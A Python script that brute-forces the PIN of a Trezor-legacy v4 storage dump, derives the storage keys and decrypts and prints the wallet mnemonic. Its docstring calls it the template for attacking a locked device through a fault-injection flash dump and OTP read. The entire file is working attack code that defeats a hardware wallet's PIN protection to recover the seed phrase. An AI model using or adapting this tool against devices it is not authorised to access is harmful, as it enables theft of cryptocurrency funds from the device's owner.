#!/usr/bin/env python
"""Offline decryptor for a Trezor-legacy v4 storage dump (the rehearsal
counterpart of make_storage.py, and the template for the locked-device run).

Parse a norcow sector image, take the (0,2) salt/EDEK/PVC entry, derive
KEK/KEIV from a candidate PIN (or brute-force a range), check the PVC,
decrypt the protected entries with the recovered DEK, print the mnemonic.

Usage:
  known PIN:   decrypt_storage.py storage.bin --pin 4179 --uid <hex> [--otp3 <hex>]
  brute-force: decrypt_storage.py storage.bin --brute 0000-9999 --uid <hex> [--otp3 <hex>]

For the real locked device: --uid/--otp3 come from the dump/OTP read,
and the sector image comes from the glitch-2 flash dump at 0x08008000.
"""
import argparse
import hashlib
import hmac
import struct
import sys
import time

from Crypto.Cipher import ChaCha20_Poly1305


NORCOW_MAGIC = 0x3243524E
BLOCK = 16
SMALL_ITEM_MAX = 12
K_EDEK_PVC = 0x0002
K_VERSION = 0x0004
K_MNEMONIC = 0x0102


def parse_items(img: bytes) -> dict:
    magic, ver = struct.unpack_from('<II', img, 0)
    if magic != NORCOW_MAGIC:
        sys.exit(f'bad norcow magic 0x{magic:08X} (expected NRC2) — '
                 f'wrong offset or corrupted dump')
    off = 8
    items = {}
    while off + BLOCK <= len(img):
        key, ln = struct.unpack_from('<HH', img, off)
        if key == 0xFFFF:            # free space
            break
        if key == 0x0000:            # deleted
            break
        if ln <= SMALL_ITEM_MAX:
            data = img[off + 4: off + 4 + ln]
            off += BLOCK
        else:
            data_start = off + BLOCK
            nfull = ln // BLOCK
            rest = ln - nfull * BLOCK
            data = img[data_start: data_start + ln]
            off = data_start + nfull * BLOCK
            off += BLOCK if rest == 0 else BLOCK
        items[key] = data
    return items


def try_pin(pin: str, hw_salt: bytes, edek_entry: bytes):
    """Returns (dek, sak) if the PIN is correct, else None."""
    salt4 = edek_entry[:4]
    ekeys = edek_entry[4:52]
    pvc = edek_entry[52:60]
    dk = hashlib.pbkdf2_hmac('sha256', pin.encode(), hw_salt + salt4, 10000, dklen=44)
    kek, keiv = dk[:32], dk[32:44]
    c = ChaCha20_Poly1305.new(key=kek, nonce=keiv)
    keys = c.decrypt(ekeys)
    # recompute the tag the only way pycryptodome offers
    c2 = ChaCha20_Poly1305.new(key=kek, nonce=keiv)
    c2.encrypt(keys)
    tag = c2.digest()
    if tag[:8] != pvc:
        return None
    return keys[:32], keys[32:48]


def decrypt_entry(key: int, data: bytes, dek: bytes):
    iv, ct, tag = data[:12], data[12:-16], data[-16:]
    c = ChaCha20_Poly1305.new(key=dek, nonce=iv)
    c.update(struct.pack('<H', key))
    try:
        return c.decrypt_and_verify(ct, tag)
    except ValueError:
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('image')
    ap.add_argument('--pin')
    ap.add_argument('--brute', help='PIN range like 0000-9999')
    ap.add_argument('--uid', required=True, help='12-byte UID hex')
    ap.add_argument('--otp3', default='ff' * 32, help='OTP block 3 hex')
    args = ap.parse_args()

    img = open(args.image, 'rb').read()
    items = parse_items(img)
    print(f'parsed {len(items)} entries: ' +
          ', '.join(f'{k:04X}({len(v)}B)' for k, v in sorted(items.items())))
    if K_VERSION in items:
        print(f'storage version = {struct.unpack("<I", items[K_VERSION])[0]}')
    if K_EDEK_PVC not in items or len(items[K_EDEK_PVC]) != 60:
        sys.exit('missing/bad (0,2) EDEK entry')

    hw_salt = hashlib.sha256(bytes.fromhex(args.uid) +
                             bytes.fromhex(args.otp3)).digest()

    candidates = []
    if args.pin:
        candidates.append(args.pin)
    elif args.brute:
        lo, hi = args.brute.split('-')
        candidates = (f'{i:0{len(hi)}d}' for i in range(int(lo), int(hi) + 1))
    else:
        sys.exit('need --pin or --brute')

    t0 = time.time()
    n = 0
    for pin in candidates:
        n += 1
        got = try_pin(pin, hw_salt, items[K_EDEK_PVC])
        if got:
            dek, sak = got
            print(f'*** PIN FOUND: {pin}  ({n} candidates, '
                  f'{time.time() - t0:.1f}s)')
            for key in (K_MNEMONIC,):
                if key in items:
                    pt = decrypt_entry(key, items[key], dek)
                    if pt is None:
                        print(f'entry {key:04X}: TAG MISMATCH')
                    else:
                        print(f'entry {key:04X}: {pt.decode(errors="replace")}')
            return
    print(f'PIN not found in {n} candidates ({time.time() - t0:.1f}s)')
    sys.exit(1)


if __name__ == '__main__':
    main()
